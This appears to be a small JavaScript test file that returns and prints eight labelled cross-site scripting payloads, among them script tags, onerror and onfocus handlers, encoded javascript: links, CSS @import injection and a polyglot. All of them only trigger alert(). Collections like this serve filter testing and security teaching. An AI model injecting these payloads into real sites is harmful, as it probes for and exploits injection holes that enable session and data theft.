function S() {
    return `<script>alert('XSS')</script>`;
}

function X() {
    return `<img src="x" onerror="alert('XSS')">`;
}

function d() {
    return `<a href="javascript%3Aalert%28%27XSS%27%29">Click me</a>`;
}

function F() {
    return `<img src="x:alert(1)" onerror="eval(src)">`;
}

function G() {
    return `<input autofocus onfocus="alert('XSS')">`;
}

function R() {
    return `" autofocus onfocus="alert('XSS')" `;
}

function T() {
    return `<style>@import "javascript:alert('XSS')";</style>`;
}

function Q() {
    return `'"><img src="x" onerror="alert(1)//'>`;
}

// Corrected console.log calls
console.log("Basic XSS: ", S());
console.log("Image OnError XSS: ", X());
console.log("URL Encoded XSS: ", d());
console.log("Obfuscated XSS: ", F());
console.log("DOM-based XSS: ", G());
console.log("Attribute XSS: ", R());
console.log("CSS Context XSS: ", T());
console.log("Polyglot XSS: ", Q());
